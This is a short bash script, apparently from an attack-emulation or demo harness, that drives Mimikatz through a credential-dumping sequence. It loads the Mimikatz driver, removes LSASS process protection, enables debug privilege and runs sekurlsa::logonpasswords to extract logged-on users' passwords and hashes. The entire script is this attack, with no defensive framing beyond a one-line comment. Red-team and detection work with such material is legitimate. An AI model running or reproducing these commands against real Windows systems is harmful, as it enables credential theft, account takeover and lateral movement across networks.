#!/bin/bash

: '
Mimikatz: Dump LSASS credentials (remove protection, debug, logonpasswords).
'

execute_command "!+"
create_new_line
create_new_line
sleep 1

execute_command "!processprotect /process:lsass.exe /remove"
create_new_line
sleep 1

execute_command "privilege::debug"
create_new_line
sleep 1

execute_command "sekurlsa::logonpasswords"
create_new_line
sleep 1

